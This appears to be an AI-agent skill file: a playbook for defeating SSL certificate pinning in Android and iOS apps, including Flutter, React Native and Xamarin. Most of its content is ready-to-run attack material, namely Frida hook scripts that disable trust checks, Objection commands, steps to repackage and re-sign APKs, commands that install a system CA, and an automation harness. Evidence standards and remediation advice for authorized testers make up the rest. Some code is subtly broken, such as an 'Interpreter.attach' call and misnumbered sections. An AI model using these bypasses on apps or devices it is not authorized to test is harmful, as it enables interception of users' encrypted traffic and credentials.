---
name: mobile-ssl-pinning-bypass
description: >-
  Mobile SSL pinning bypass playbook. Use when intercepting HTTPS traffic from mobile applications that implement certificate pinning, public key pinning, or SPKI hash pinning on Android and iOS, including React Native, Flutter, and Xamarin frameworks.
---

# SKILL: Mobile SSL Pinning Bypass — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert SSL pinning bypass techniques for mobile platforms. Covers Android and iOS bypass methods (Frida, Objection, Xposed, SSL Kill Switch), framework-specific bypasses (Flutter, React Native, Xamarin), and troubleshooting non-standard pinning implementations. Base models miss framework-specific hook points and multi-layer pinning configurations.

## 0. RELATED ROUTING

Before going deep, consider loading:

- [android-pentesting-tricks](../android-pentesting-tricks/SKILL.md) for broader Android testing beyond SSL bypass
- [ios-pentesting-tricks](../ios-pentesting-tricks/SKILL.md) for broader iOS testing beyond SSL bypass
- [api-sec](../api-sec/SKILL.md) once traffic is intercepted for API-level testing

---

## 1. SSL PINNING TYPES

| Pinning Type | What Is Pinned | Resilience | Common In |
|---|---|---|---|
| Certificate pinning | Exact leaf certificate (DER/PEM) | Low (breaks on cert rotation) | Legacy apps |
| Public key pinning | Subject Public Key Info | Medium (survives cert renewal if key unchanged) | Modern apps |
| SPKI hash pinning | SHA-256 of SPKI | Medium (same as public key) | OkHttp, AFNetworking |
| CA pinning | Intermediate or root CA cert | High (any cert from that CA works) | Enterprise apps |
| Multi-pin (backup pins) | Primary + backup pins | High (fallback pins) | HPKP-aware apps |

### How Pinning Works

```
TLS Handshake
│
├── Server presents certificate chain
│
├── Standard validation (system trust store)
│   └── Passes? continue : connection fails
│
└── Pin validation (app-level check)
    ├── Extract server cert/pubkey/SPKI hash
    ├── Compare against embedded pins
    └── Match found? → allow : → reject connection
```

---

## 2. ANDROID BYPASS METHODS

### 2.1 Frida Universal SSL Bypass

```javascript
// Hooks TrustManager, OkHttp, Volley, Retrofit, Conscrypt
Java.perform(function() {

    // ── TrustManagerImpl (Android system) ──
    try {
        var TMI = Java.use('com.android.org.conscrypt.TrustManagerImpl');
        TMI.verifyChain.implementation = function() {
            console.log('[Bypass] TrustManagerImpl.verifyChain');
            return arguments[0]; // return untouched chain
        };
    } catch(e) {}

    // ── X509TrustManager (custom implementations) ──
    var TrustManager = Java.registerClass({
        name: 'com.bypass.TrustManager',
        implements: [Java.use('javax.net.ssl.X509TrustManager')],
        methods: {
            checkClientTrusted: function() {},
            checkServerTrusted: function() {},
            getAcceptedIssuers: function() { return []; }
        }
    });

    var SSLContext = Java.use('javax.net.ssl.SSLContext');
    SSLContext.init.overload('[Ljavax.net.ssl.KeyManager;',
        '[Ljavax.net.ssl.TrustManager;', 'java.security.SecureRandom')
        .implementation = function(km, tm, sr) {
        console.log('[Bypass] SSLContext.init');
        this.init(km, [TrustManager.$new()], sr);
    };

    // ── OkHttp3 CertificatePinner ──
    try {
        var CP = Java.use('okhttp3.CertificatePinner');
        CP.check.overload('java.lang.String', 'java.util.List').implementation = function() {
            console.log('[Bypass] OkHttp3 CertificatePinner.check: ' + arguments[0]);
        };
        // check$okhttp variant (OkHttp 4.x)
        try { CP['check$okhttp'].implementation = function() {}; } catch(e) {}
    } catch(e) {}

    // ── Retrofit / OkHttp interceptor ──
    try {
        var OkHttpClient = Java.use('okhttp3.OkHttpClient$Builder');
        OkHttpClient.certificatePinner.implementation = function(pinner) {
            console.log('[Bypass] OkHttpClient.Builder.certificatePinner');
            return this; // return builder without pinner
        };
    } catch(e) {}

    // ── Volley (HurlStack) ──
    try {
        var HurlStack = Java.use('com.android.volley.toolbox.HurlStack');
        HurlStack.createConnection.implementation = function(url) {
            console.log('[Bypass] Volley HurlStack: ' + url);
            var conn = this.createConnection(url);
            // Remove hostname verifier
            conn.setHostnameVerifier(Java.use(
                'javax.net.ssl.HttpsURLConnection').getDefaultHostnameVerifier());
            return conn;
        };
    } catch(e) {}

    // ── Conscrypt / BoringSSL (modern Android) ──
    try {
        var Conscrypt = Java.use('org.conscrypt.ConscryptFileDescriptorSocket');
        Conscrypt.verifyCertificateChain.implementation = function() {
            console.log('[Bypass] Conscrypt verifyCertificateChain');
        };
    } catch(e) {}

    // ── Apache HttpClient (legacy) ──
    try {
        var AbstractVerifier = Java.use('org.apache.http.conn.ssl.AbstractVerifier');
        AbstractVerifier.verify.overload('java.lang.String', '[Ljava.lang.String;',
            '[Ljava.lang.String;', 'boolean').implementation = function() {
            console.log('[Bypass] Apache AbstractVerifier');
        };
    } catch(e) {}

    // ── HostnameVerifier ──
    try {
        var HV = Java.use('javax.net.ssl.HttpsURLConnection');
        HV.setDefaultHostnameVerifier.implementation = function(v) {
            console.log('[Bypass] Ignoring custom HostnameVerifier');
        };
    } catch(e) {}

    console.log('[+] Android universal SSL bypass loaded');
});
```

### 2.2 Objection (One Command)

```bash
objection -g com.target.app explore --startup-command "android sslpinning disable"
```

### 2.3 Network Security Config (Debug Override)

```xml
<!-- AndroidManifest.xml: android:networkSecurityConfig="@xml/network_security_config" -->

<!-- res/xml/network_security_config.xml -->
<network-security-config>
  <base-config>
    <trust-anchors>
      <certificates src="system" />
      <certificates src="user" />     <!-- Trust user-installed CAs -->
    </trust-anchors>
  </base-config>
</network-security-config>
```

Workflow: decompile APK → add/modify config → repackage → re-sign → install.

```bash
apktool d target.apk -o target_dir
# Edit res/xml/network_security_config.xml
# Add reference in AndroidManifest.xml if missing
apktool b target_dir -o target_patched.apk
zipalign -v 4 target_patched.apk target_aligned.apk
apksigner sign --ks my-key.keystore target_aligned.apk
adb install target_aligned.apk
```

### 2.4 Xposed / LSPosed Modules

| Module | Method | Scope | Root Required |
|---|---|---|---|
| JustTrustMe | Hooks TrustManager + OkHttp | Per-app | Yes (Xposed) |
| SSLUnpinning | Hooks certificate validation | Per-app | Yes (LSPosed) |
| TrustMeAlready | Global TrustManager bypass | System-wide | Yes (LSPosed) |

### 2.5 Magisk + System CA Installation

```bash
# Install proxy CA as system cert (Android 7+ requires this for system-level trust)
# Method 1: MagiskTrustUserCerts module
# Moves user CAs to /system/etc/security/cacerts/ via Magisk overlay

# Method 2: Manual (requires root)
adb push burp_ca.pem /sdcard/
adb shell
su
mount -o remount,rw /system
cp /sdcard/burp_ca.pem /system/etc/security/cacerts/9a5ba575.0  # hash-named
chmod 644 /system/etc/security/cacerts/9a5ba575.0
mount -o remount,ro /system

# Get correct hash filename:
openssl x509 -inform PEM -subject_hash_old -in burp_ca.pem | head -1
# Output: 9a5ba575 → filename is 9a5ba575.0
```

### 2.6 Manual Decompile → Patch → Repackage

```text
# Step 1: Decompile
jadx -d decompiled/ target.apk

# Step 2: Find pinning code
grep -r "CertificatePinner\|X509TrustManager\|checkServerTrusted\|ssl" decompiled/

# Step 3: Identify pinning implementation and patch
# Use smali editing for precise control:
apktool d target.apk
# Edit smali files to NOP out pinning checks
# Look for invoke-virtual {checkServerTrusted} and replace with return-void

# Step 4: Repackage and sign
apktool b target_dir -o patched.apk
apksigner sign --ks debug.keystore patched.apk
```

---

## 3. iOS BYPASS METHODS

### 3.1 Frida (SecTrust Hooks)

```javascript
// Hook core iOS SSL validation functions
var SecTrustEvaluateWithError = Module.findExportByName('Security', 'SecTrustEvaluateWithError');
Interceptor.attach(SecTrustEvaluateWithError, {
    onLeave: function(retval) {
        retval.replace(ptr(1));
    }
});

var SecTrustEvaluate = Module.findExportByName('Security', 'SecTrustEvaluate');
Interceptor.attach(SecTrustEvaluate, {
    onLeave: function(retval) {
        retval.replace(ptr(0));
    }
});

// Hook SSLHandshake (lower-level)
var SSLHandshake = Module.findExportByName('Security', 'SSLHandshake');
if (SSLHandshake) {
    Interceptor.attach(SSLHandshake, {
        onLeave: function(retval) {
            if (retval.toInt32() === -9807) { // errSSLXCertChainInvalid
                retval.replace(ptr(0));
            }
        }
    });
}

// Hook NSURLSession delegate method
try {
    var cls = ObjC.classes.NSURLSession;
    // Hook URLSession:didReceiveChallenge:completionHandler: on delegates
    ObjC.enumerateLoadedClasses({
        onMatch: function(name) {
            try {
                var methods = ObjC.classes[name].$ownMethods;
                for (var i = 0; i < methods.length; i++) {
                    if (methods[i].indexOf('didReceiveChallenge') !== -1 &&
                        methods[i].indexOf('completionHandler') !== -1) {
                        console.log('[SSL] Found delegate: ' + name + ' ' + methods[i]);
                    }
                }
            } catch(e) {}
        },
        onComplete: function() {}
    });
} catch(e) {}
```

### 3.2 Objection (One Command)

```bash
objection -g com.target.app explore --startup-command "ios sslpinning disable"
```

### 3.3 SSL Kill Switch 2 (Jailbreak Tweak)

```bash
# Install via Cydia/Sileo
# Package: com.nablac0d3.sslkillswitch2
# Disables SSL pinning system-wide or per-app via Settings toggle

# Hooks:
# - SecTrustEvaluate
# - SSLHandshake
# - SSLSetSessionOption
# - tls_helper_create_peer_trust
```

### 3.4 Library-Specific Hooks

| Library | iOS Hook Point | Frida Approach |
|---|---|---|
| AFNetworking | `AFSecurityPolicy.evaluateServerTrust:forDomain:` | Return YES |
| Alamofire | `ServerTrustManager.evaluate(_:forHost:)` | Skip evaluation |
| TrustKit | `TSKPinningValidator verifyPublicKeyPin:` | Return success |
| NSURLSession | `URLSession:didReceiveChallenge:completionHandler:` | Call completionHandler with .useCredential |

### 3.5 Manual Binary Patch

```text
# Find pinning function in binary
strings decrypted_binary | grep -i "pin\|cert\|trust"
# Disassemble and find the validation function
# Replace comparison/branch instruction with NOP or unconditional pass

# LLDB runtime modification
lldb -n TargetApp
(lldb) breakpoint set -n "SecTrustEvaluateWithError"
(lldb) breakpoint command add 1
> thread return 1
> continue
> DONE
```

---

## 4. FRAMEWORK-SPECIFIC BYPASSES

### 4.1 Flutter

Flutter uses Dart's `dart:io` library with BoringSSL underneath. Standard Frida hooks on Java/ObjC layers don't work.

```javascript
// Flutter SSL bypass — must hook BoringSSL directly
// Find ssl_crypto_x509_session_verify_cert_chain in libflutter.so
var libflutter = Process.findModuleByName('libflutter.so');  // Android
// var libflutter = Process.findModuleByName('Flutter');       // iOS

// Hook ssl_verify_peer_cert (BoringSSL function)
// Signature varies by Flutter version — use pattern scanning
var pattern = 'FF C3 ..';  // Example pattern, varies
var matches = Memory.scan(libflutter.base, libflutter.size, pattern, {
    onMatch: function(address, size) {
        console.log('[Flutter] Potential verify function at: ' + address);
        Interceptor.attach(address, {
            onLeave: function(retval) {
                retval.replace(ptr(0));  // SSL_VERIFY_OK
            }
        });
    },
    onComplete: function() {}
});

// Alternative: use reflutter tool for automated patching
// reflutter target.apk
// This patches BoringSSL in the Flutter engine directly
```

**reflutter tool** (recommended for Flutter apps):

```bash
pip install reflutter
reflutter target.apk
# Outputs patched APK that redirects traffic to your proxy
# Also disables SSL verification in the BoringSSL engine
```

### 4.2 React Native

React Native uses platform networking: OkHttp on Android, NSURLSession on iOS.

| Platform | Networking Stack | Bypass Method |
|---|---|---|
| Android | OkHttp3 | Standard OkHttp CertificatePinner hook |
| iOS | NSURLSession | Standard SecTrust hooks |
| Android (Hermes) | Same OkHttp | Same hooks, but Hermes JIT may need additional handling |

```javascript
// React Native Android — same as OkHttp bypass
Java.perform(function() {
    try {
        var CP = Java.use('okhttp3.CertificatePinner');
        CP.check.overload('java.lang.String', 'java.util.List').implementation = function() {};
    } catch(e) { console.log('OkHttp3 not found, trying okhttp2...'); }

    try {
        var CP2 = Java.use('com.squareup.okhttp.CertificatePinner');
        CP2.check.overload('java.lang.String', 'java.util.List').implementation = function() {};
    } catch(e) {}
});
```

### 4.3 Xamarin

```csharp
// Xamarin pinning typically via:
// ServicePointManager.ServerCertificateValidationCallback
// or custom HttpClientHandler
```

```javascript
// Frida bypass for Xamarin (Mono runtime)
// Hook Mono method: System.Net.ServicePointManager.set_ServerCertificateValidationCallback
var mono_method = Module.findExportByName('libmonosgen-2.0.so',
    'mono_runtime_invoke');
// More practical: hook the managed callback at CIL level
// Use Frida's Mono bridge or objection's built-in Xamarin support

// Objection has built-in Xamarin bypass:
// objection -g com.target.app explore
// > android sslpinning disable   (covers Xamarin on Android)
```

---

## 5. CERTIFICATE TRANSPARENCY & HPKP

| Technology | Status | Impact on Testing |
|---|---|---|
| Certificate Transparency (CT) | Active, enforced by browsers | Mobile apps rarely enforce CT; not a bypass obstacle |
| HPKP (HTTP Public Key Pinning) | Deprecated (2018) | Legacy apps may still check; remove header from proxy response |
| Expect-CT header | Deprecated (2024) | Minimal impact on mobile testing |
| CT in mobile apps | Rare | Only Google apps enforce via custom CT checks |

---

## 6. TROUBLESHOOTING

### 6.1 Common Failures

| Symptom | Cause | Fix |
|---|---|---|
| Bypass script loaded but traffic still fails | Multiple pinning layers | Hook ALL layers: TrustManager + OkHttp + custom checks |
| "Client certificate required" | Mutual TLS (mTLS) | Extract client cert from app bundle/keychain, import into proxy |
| Connection works but no HTTP traffic | Non-HTTP protocol (MQTT, gRPC, WebSocket) | Use Wireshark or protocol-specific proxy |
| App crashes after bypass | Anti-tampering detects hooks | Bypass integrity checks first, then SSL |
| Proxy CA not trusted | Android 7+ user CA restrictions | Install CA as system cert (Magisk module) |
| Flutter app ignores hooks | BoringSSL not hooked at native layer | Use reflutter or native BoringSSL hooks |
| Certificate chain validation timeout | OCSP stapling mismatch | Disable OCSP checks or mock OCSP responder |

### 6.2 Diagnostic Steps

```bash
# Verify proxy CA is installed correctly
# Android:
adb shell "ls /system/etc/security/cacerts/ | grep $(openssl x509 -subject_hash_old -in ca.pem | head -1)"

# iOS: Settings → General → About → Certificate Trust Settings

# Check if target app is actually using SSL (vs. plain HTTP)
# Wireshark filter: tcp.port == 443 and ip.addr == <device_ip>

# Check if Frida is hooking the right process
frida-ps -U | grep target

# Verbose Frida output for debugging hooks
frida -U -f com.target.app -l bypass.js --debug
```

---

## 7. SSL PINNING BYPASS DECISION TREE

```
Need to intercept mobile app HTTPS traffic
│
├── Platform?
│   ├── Android ↓
│   │   ├── Rooted device available?
│   │   │   ├── Yes → Frida universal bypass (§2.1) [FIRST TRY]
│   │   │   │   ├── Works? → done
│   │   │   │   └── Fails? → add Conscrypt + Volley hooks
│   │   │   ├── Still fails? → LSPosed + TrustMeAlready (§2.4)
│   │   │   └── Still fails? → install CA as system cert (§2.5)
│   │   └── No root?
│   │       ├── Debug build? → Network Security Config (§2.3)
│   │       └── Release build? → decompile + patch + repackage (§2.6)
│   │
│   └── iOS ↓
│       ├── Jailbroken device available?
│       │   ├── Yes → Objection ios sslpinning disable (§3.2) [FIRST TRY]
│       │   │   ├── Works? → done
│       │   │   └── Fails? → Frida SecTrust hooks (§3.1)
│       │   ├── Still fails? → SSL Kill Switch 2 (§3.3)
│       │   └── Still fails? → library-specific hooks (§3.4)
│       └── No jailbreak?
│           ├── Re-sign with Frida gadget → run Frida hooks
│           └── Binary patch → sideload (§3.5)
│
├── Framework-specific app?
│   ├── Flutter → reflutter tool or BoringSSL native hooks (§4.1)
│   ├── React Native → standard platform hooks (§4.2)
│   └── Xamarin → Objection or Mono runtime hooks (§4.3)
│
├── Bypass works but issues remain?
│   ├── Client cert required? → extract + import to proxy (§6.1)
│   ├── Non-HTTP protocol? → protocol-specific tooling (§6.1)
│   └── App crashes? → fix anti-tampering first (§6.1)
│
└── All methods fail?
    ├── Analyze traffic at network level (Wireshark/tcpdump)
    ├── Check for custom proprietary protocol
    └── Consider iptables + transparent proxy approach
```

---

## 8. PROXY SETUP QUICK REFERENCE

| Proxy Tool | Best For | SSL Bypass Integration |
|---|---|---|
| Burp Suite | Full HTTP analysis | Import CA to device |
| mitmproxy | Scripted interception | `mitmproxy --set confdir=~/.mitmproxy` |
| Charles Proxy | macOS-native, easy setup | Built-in CA installation |
| Proxyman | macOS/iOS native | Direct iOS device support |
| HTTP Toolkit | Quick Android setup | Automated CA + Frida bypass |

```bash
# Android proxy setup
adb shell settings put global http_proxy <host_ip>:8080

# Remove proxy
adb shell settings put global http_proxy :0

# iOS proxy: Settings → Wi-Fi → Configure Proxy → Manual
```

---

## 9. CONFIRMING THE FINDING — BYPASS, NOT A HOOK THAT RAN
A pinning bypass is proven by **intercepted traffic that the app treats as authentic**, not by a
Frida script printing "hooked". The distinction matters because a partial bypass produces a
connection that succeeds while the app still refuses to use it, or traffic that appears decrypted in
Burp while the app is in fact using a second, pinned channel.

| Step | Question | What it proves |
|---|---|---|
| 1 | Does the app **complete an authenticated transaction** through the proxy? | the app accepted your CA for a real flow, not just a handshake |
| 2 | Are the **decrypted request and response bodies** visible in the proxy for a privileged action? | pinning is off for the channel that matters |
| 3 | Is there **no second pinned library** still enforcing (native, framework, or a pinned second host)? | rules out a partial bypass of one layer |
| 4 | Does the app behave **normally** (no error, no offline banner, no retry loop)? | the app is not silently falling back to a pinned path |
| 5 | Does the bypass hold across **app restart and a fresh session**? | the hook is applied at the right point in the lifecycle |
| 6 | Is the traffic **complete** - no gaps in the sequence, no unexplained certificate errors? | confirms all channels are intercepted |
| 7 | Can you **replay a modified request** and observe the app's response? | proves control of the channel, which is the actual objective |

**The test is a real transaction, not a hook log.** Open a screen that requires server data in the
app, perform the action, and confirm both the outbound request and the inbound response appear in
your proxy and the app renders the result. `Frida -l bypass.js` printing `SSL_CTX_set_custom_verify
hooked` without a successful transaction proves nothing.

**Watch for multi-layer pinning.** Modern apps pin in several places at once: the Java/Kotlin
networking stack, a native library (BoringSSL/OpenSSL via JNI), the framework layer (Flutter's
`libflutter.so`, React Native's own stack), and sometimes a third-party SDK with its own pinning.
A bypass that satisfies one layer leaves the others enforcing, which manifests as an app that
"works" for unauthenticated screens and fails for authenticated ones.

**Check for non-HTTP channels.** gRPC, WebSocket, MQTT, and custom binary protocols are frequently
pinned separately or use certificate transparency checks; if HTTP is intercepted but a feature still
fails, the feature is likely on another channel.

---

## 10. EVIDENCE STANDARD

| Item | Why |
|---|---|
| **Proxy log showing a complete authenticated transaction** - request and response bodies for a privileged action | the definitive proof; a hook log is not |
| The **bypass artefact** (Frida script, patched APK/IPA, Objection command, Xposed module) with its exact version | bypasses are version- and architecture-specific |
| **Device/OS and app version, build number, and architecture** (arm64-v8a, armeabi-v7a) | Frida scripts fail silently on the wrong ABI or a stripped build |
| The **pinning layers observed** (Java, native, Flutter, RN, SDK) and which one each bypass addressed | explains residual failures and what is still unfixed |
| The **app's rendered result** after the intercepted call (a screenshot or UI state) | proves the app accepted the intercepted data, not merely that a socket opened |
| Any **certificate error or fallback** observed, with the exact message | distinguishes a clean bypass from a partial one |
| For a patched binary: the **diff or the injection point**, and confirmation the app functions normally otherwise | shows the patch is surgical and the evidence is not from a broken build |
| **Negative control** - with the proxy not trusted (or pinning intact), the app fails the same action | proves the bypass, not a misconfigured device |
| Confirmation that **only the test device** was modified | production integrity is unaffected; avoids an incident |

Report the **layer bypassed and the transaction captured**: "the app pins only in the Java layer
(`OkHttp CertificatePinner`); hooking `SSLContext.init` with the supplied Frida script let the app
complete a login and a `/v1/accounts` fetch through the proxy, both captured in full; the native
`libflutter.so` is not present, so no framework-layer bypass was required", never "SSL pinning was
bypassed".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| Frida prints a hook message but no traffic appears | the hook did not take effect; wrong ABI, wrong layer, or app detected it |
| Only unauthenticated endpoints are intercepted; login still fails | partial bypass; the pinned channel is elsewhere |
| Burp shows a TLS handshake but no application data | the app opened the connection and rejected the certificate afterward |
| The app shows a generic network error and you assume tamper detection | it may simply be a failed certificate validation, not detection |
| Bypass works only on an **already-rooted, already-instrumented** test build | tests the toolchain, not the production app |
| Traffic from a **third-party SDK** is intercepted but the app's own channel is not | the interesting channel remains pinned |
| The device has a global proxy CA installed and the app is a debug build | debug builds frequently skip pinning by design |
| App works offline or serves cached data during your test | no live channel was exercised |
| The bypass uses a **repackaged** APK that no longer behaves identically | the evidence is about your build, not the shipped one |
| No pinning is implemented at all in the target | nothing was bypassed; that is a separate (and much smaller) finding |

**Always tie the bypass to a real transaction.** Without one captured privileged call, the result is
an unresolved attempt.

---

## 11. REMEDIATION REFERENCE

1. **Pin to the SPKI hash of the leaf or intermediate, with a backup pin** - certificate pinning on the full certificate breaks on rotation, while no backup pin bricks the app during a CA or certificate change; pin the public key and ship at least one rotation pin.
2. **Pin in the native layer as well as the managed layer** - Java-only pinning is defeated by hooking `SSLContext`, `X509TrustManager`, or the OkHttp pinner; enforcing in native code (BoringSSL/OpenSSL, or a hardened networking library compiled into the app) removes the single hook point.
3. **Do not rely on a hookable single function** - distribute the check, verify the pin at the point of use, and avoid a single well-known symbol; integrity-check the code paths that perform the validation.
4. **Add runtime integrity and tamper detection with a graceful response** - detect root, Frida, Xposed, debuggers, and repackaging, and respond in a way that is not a simple boolean (a boolean is patched by one hook); combine checks and re-verify at transaction time.
5. **Do not ship secrets or trust decisions in the client** - pinning raises the cost of interception; it does not make the client trusted. Assume the client is hostile and enforce authorization server-side.
6. **Cover every channel, not just HTTP** - gRPC, WebSocket, MQTT, and custom protocols need their own validation; a pinned REST client alongside an unpinned WebSocket is the common gap.
7. **Pin framework networking explicitly** - Flutter (`libflutter.so`), React Native, Xamarin, and Cordova each carry their own TLS stack and ignore the platform pin when configured separately.
8. **Validate the hostname and the chain, not just the pin** - a pin check that skips hostname verification enables a valid-certificate-for-the-wrong-host attack; keep full validation and add the pin as an additional constraint.
9. **Enforce certificate transparency where available** - CT and OCSP-stapling checks raise the bar against a compromised or mis-issued CA, complementing pinning rather than replacing it.
10. **Rotate pins with an operational plan, and monitor failure telemetry** - a pinned app that fails closed on a rotation is an outage; stage the new pin before the certificate change and alert on pin-failure spikes.
11. **Treat interception as expected and design for it** - short-lived tokens, per-request authorization, and server-side anomaly detection ensure that a successful interception (which is always achievable on a device you control) does not equal account compromise.

---

---

## 12. EXECUTION PRIMITIVES
Pinning bypass is proven by **the same request failing before the patch and succeeding after it**. The
control pair is the entire finding; a proxy that simply works proves the app does not pin.

### 13.1 The control pair, established before any patch

```bash
PKG="com.target.app"; HOST="api.target.app"
mitmproxy -p 8080 --save-stream-file /tmp/flow.dump &
# route the device and install the CA
adb shell settings put global http_proxy 10.0.2.2:8080
curl -sS -o /dev/null -w 'hostreach %{http_code}\n' -x http://127.0.0.1:8080 "https://$HOST/" 2>&1 | tail -1
# THE CONTROL: exercise the app; the pinned host must FAIL in mitmproxy's log
adb shell am start -n "$PKG/.MainActivity" 2>&1 | head -2
sleep 8
python3 -c "
import re
try:
    t=open('/tmp/flow.dump','rb').read()
    print('flows captured:', t.count(b'HTTP/1'))
except FileNotFoundError:
    print('no flow file - run mitmproxy with --save-stream-file')"
echo "record the TLS error you see for $HOST - this is the control for every claim below"
```

**Record the control failure explicitly.** Without it, a working proxy is indistinguishable from an app
that never pinned, and the "bypass" is a fabrication.

### 13.2 Android without Frida: repackage the APK

```bash
apktool d -f -o /tmp/apk target.apk 2>&1 | tail -1
# the pinning implementation, which determines the patch
grep -rEli 'certificatepinner|X509TrustManager|checkServerTrusted|sha256/|pinning' /tmp/apk/smali* 2>/dev/null | head -10
# patch the trust manager, then rebuild, sign, and install
python3 -c "
print('patch the checkServerTrusted body to return, or strip the CertificatePinner.add() calls')" 2>/dev/null
apktool b -o /tmp/patched.apk /tmp/apk 2>&1 | tail -1
keytool -genkey -keystore /tmp/k.jks -alias k -keyalg RSA -keysize 2048 -storepass pass123 -dname 'CN=x' 2>/dev/null
apksigner sign --ks /tmp/k.jks --ks-pass pass:pass123 /tmp/patched.apk 2>&1 | tail -1
adb install -r /tmp/patched.apk 2>&1 | tail -2
# and the SAME request that failed in 13.1 must now appear in the proxy
curl -sS -o /dev/null -w 'patched %{http_code}\n' -x http://127.0.0.1:8080 "https://$HOST/" 2>&1 | tail -1
```

**The repackage path is the fallback when Frida is unavailable**, and it must produce the same control
pair: failing before, succeeding after. Repackaging alone is not a finding.

### 13.3 Android with Frida: unhook at runtime

```bash
# the general script: enumerate the pinning classes, then disable the checks
cat > /tmp/unpin.js <<'JS'
Java.perform(function () {
  var names = ["okhttp3.CertificatePinner","com.android.org.conscrypt.TrustManagerImpl",
               "javax.net.ssl.X509TrustManager","android.security.net.config.NetworkSecurityTrustManager"];
  names.forEach(function (n) {
    try {
      var K = Java.use(n);
      K.checkServerTrusted.overloads.forEach(function (o) {
        o.implementation = function () { console.log("[unpin] " + n); return; };
      });
    } catch (e) { console.log("[skip] " + n); }
  });
  try {
    var SB = Java.use("okhttp3.CertificatePinner$Builder");
    SB.add.implementation = function (p) { console.log("[unpin] add " + p); return this; };
  } catch (e) {}
});
JS
frida -U -f "$PKG" -l /tmp/unpin.js --no-pause > /tmp/frida.log 2>&1 &
sleep 6
grep -c '\[unpin\]' /tmp/frida.log
# and re-exercise the app, then confirm the host now appears in the proxy
adb shell am start -n "$PKG/.MainActivity" 2>&1 | head -2
sleep 8; grep -c 'api.target.app' /tmp/flow.dump 2>/dev/null || echo "check mitmproxy for the host"
```

**`[unpin]` lines in the Frida log plus the host appearing in the proxy is the finding.** The Frida
console output is an artefact that must be captured to a file with a timestamp.

### 13.4 iOS: Frida-based unpinning

```bash
cat > /tmp/ios-unpin.js <<'JS'
if (ObjC.available) {
  var SSL = Module.findExportByName(null, "SSL_verify_result");
  if (SSL) { Interceptor.replace(SSL, new NativeCallback(function () { return 0; }, "int", ["pointer"])); console.log("[unpin] SSL_verify_result"); }
  var CT = Module.findExportByName(null, "SecTrustEvaluate");
  if (CT) { Interpreter.attach(CT).onLeave(function () { this.retval.replace(0x01); console.log("[unpin] SecTrustEvaluate"); }); }
  var NE = Module.findExportByName(null, "SecTrustEvaluateWithError");
  if (NE) { Interpreter.attach(NE).onLeave(function () { this.retval.replace(0x01); }); }
  try {
    var P = ObjC.classes.AFSecurityPolicy;
    if (P) { Interceptor.attach(P["- evaluateServerTrust:forDomain:"].implementation, { onLeave: function (r) { r.replace(0x1); } }); }
  } catch (e) {}
}
JS
frida -U -f "$APP" -l /tmp/ios-unpin.js > /tmp/frida-ios.log 2>&1 &
sleep 6; grep -c '\[unpin\]' /tmp/frida-ios.log
# and the control pair applied to the device traffic as in 13.1
```

**The same discipline applies on iOS: fail before, succeed after.** The `SSL_verify_result` hook is the
least invasive and works for most apps built on `NSURLSession`.

### 13.5 Framework-specific variants

```bash
# Flutter: the pinning lives in the Dart AOT binary, not in Java
strings /tmp/libapp.so 2>/dev/null | grep -ciE 'sha256/|badCertificateCallback|SecurityContext'
# patch the binary's comparison, or use a Frida hook on the exported symbol
python3 -c "print('Flutter pinning is compiled; repackage the .so or hook the compare in native code')" 2>/dev/null
# React Native: the pin usually lives in a native module or a JS-level check
grep -rEli 'TrustManager|pin' /tmp/apk/assets/index.android.bundle 2>/dev/null | head -3
# Xamarin and Unity: the pinning is in the managed or IL2CPP layer
ls -la /tmp/apk/assemblies/ 2>/dev/null | head -5
# and the certificate-transparency check, which is separate from pinning
# (an app enforcing CT will reject a proxy CA even when pinning is disabled)
```

**Name the framework and its layer in the report.** A Flutter bypass and an OkHttp bypass are different
findings with different remediations, and conflating them misdirects the fix.

### 13.6 The proxy, certificate, and user-CA obstacles

```bash
# Android 7+: user CAs are ignored by default unless the app opts in
grep -rn 'networkSecurityConfig' /tmp/apk/AndroidManifest.xml 2>/dev/null | head -2
cat /tmp/apk/res/xml/network_security_config.xml 2>/dev/null | head -20
# the non-root workaround: patch the config to trust the user CA, then repackage
# the root workaround: install the CA into the system store
adb push /tmp/mitm.pem /sdcard/ 2>&1 | head -1
# and the pinning that lives in the network security config itself
grep -rn 'pin-set\|<pin ' /tmp/apk/res/xml/*.xml 2>/dev/null | head -10
```

**Report which obstacle applied.** "Pinning" and "user-CA trust" are different findings; the fix for the
second is a one-line config change and the report should say which one it was.

### 13.7 The end-to-end harness

```bash
python3 - <<'PY'
import subprocess, os, time
PKG, HOST, PROXY = "com.target.app", "api.target.app", "http://127.0.0.1:8080"
def sh(cmd, timeout=40):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return (r.stdout + r.stderr).strip()[:120]
    except Exception as e:
        return type(e).__name__

print("STEP 1 - the control: the pinned host must fail BEFORE the patch")
print("  ", sh("curl -sS -o /dev/null -w '%{http_code}' -x %s https://%s/ --max-time 8" % (PROXY, HOST)))
print("     if this returns 200, the app does not pin and there is no finding to report here")
print()
print("STEP 2 - locate the pinning layer")
print("  ", sh("grep -rEli 'CertificatePinner|checkServerTrusted' /tmp/apk 2>/dev/null | head -2"))
print()
print("STEP 3 - apply the patch and re-exercise the app")
print("     capture the Frida log to a file, and confirm the [unpin] markers are present")
print()
print("STEP 4 - the evidence: the SAME request now succeeds, and the host appears in the proxy dump")
print("     both the before and after captures belong in the report, side by side")
print()
print("STEP 5 - name the layer (OkHttp, TrustManager, Flutter, RN, native) and the bypass method")
PY
```

**Five steps, and steps 1 and 4 are the finding.** A report that shows only step 4 is not verifiable.

---

## 13. RELATED SIBLINGS - LOAD TOGETHER

- [android-pentesting-tricks](../android-pentesting-tricks/SKILL.md) - the runtime findings this interception unlocks
- [ios-pentesting-tricks](../ios-pentesting-tricks/SKILL.md) - the iOS counterpart, with the same control discipline
- [api-authorization-and-bola](../api-authorization-and-bola/SKILL.md) - what the intercepted traffic reveals
- [jwt-oauth-token-attacks](../jwt-oauth-token-attacks/SKILL.md) - the tokens the intercepted traffic carries
- [burp-scan](../burp-scan/SKILL.md) - the HTTP tooling that consumes the decrypted traffic
